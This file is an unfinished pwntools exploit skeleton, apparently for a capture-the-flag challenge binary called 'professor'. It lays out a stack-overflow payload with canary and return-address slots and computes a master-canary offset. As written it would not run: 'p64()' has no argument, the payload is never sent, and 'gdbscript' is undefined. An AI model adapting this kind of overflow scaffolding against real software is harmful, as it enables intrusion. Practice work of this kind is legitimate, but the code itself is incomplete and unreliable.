#!/usr/bin/env python3

from pwn import *

exe = ELF("./professor_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe


def start(argv=[], *a, **kw):
    if args.GDB: # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # Run locally
        return process([exe] + argv, *a, **kw)

def main():
    r = start()

    buf_addr = 0x7ffff8dadec0
    master_canary_addr = 0x7ffff7dae728
    master_canary_addr_off = buf_addr - master_canary_addr

    got_puts_addr = exe.got["puts"]
    print(got_puts_addr)


    payload = flat(
        b'A' * 40,  # offset to canary
        b'B' * 8,   # canary
        b'A' * 8,   # rbp
        p64(),      # ret
    ) 

    r.interactive()


if __name__ == "__main__":
    main()
